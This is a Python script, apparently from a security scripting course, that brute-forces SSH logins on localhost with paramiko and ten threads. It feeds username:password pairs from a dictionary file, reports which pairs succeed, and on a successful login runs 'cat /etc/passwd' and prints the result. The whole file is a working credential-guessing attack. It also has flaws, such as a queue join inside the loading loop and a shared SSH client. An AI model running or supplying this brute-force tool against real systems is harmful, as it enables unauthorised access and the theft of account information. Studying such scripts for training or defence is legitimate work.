#!/usr/bin/env python

# Author: SPSE-3232
# Purpose:
# - ssh bruteforce with parakimo multithreaded

import paramiko
import argparse
import os
from threading import Thread
from queue import Queue


def login(q):
    while True:
        user, password = q.get()
        try:
            ssh.connect('localhost', username=user, password=password)
        except paramiko.AuthenticationException:
            print('[-] Username {u} and Password {p} are incorrect!'.format(u=user, p=password))
        else:
            print('[+] Username {u} and Password {p} are correct!'.format(u=user, p=password))
            stdin, stdout, stderr = ssh.exec_command('cat /etc/passwd')
            for line in stdout.readlines():
                print(line.strip())
        q.task_done()


ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

parser = argparse.ArgumentParser(description='Dictionary containing user:password')
parser.add_argument('-f', '--file', help='file.', required=True)
args = parser.parse_args()

if not os.path.exists(args.file):
    print('File not found!')
    exit(1)

num_threads = 10

print("Creating queue...")
q = Queue()

for x in range(num_threads):
    print("Daemonizing Thread %d..." % x)
    worker = Thread(target=login, args=(q, ))
    worker.setDaemon(True)
    worker.start()
    print("Thread %d Daemonized!" % x)

# Start to crawl recursively pages
print("Populating queue....")
with open(args.file, 'r') as fd:
    for line in fd.readlines():
        user, password = line.strip().split(':')
        q.put((user, password))
        q.join()
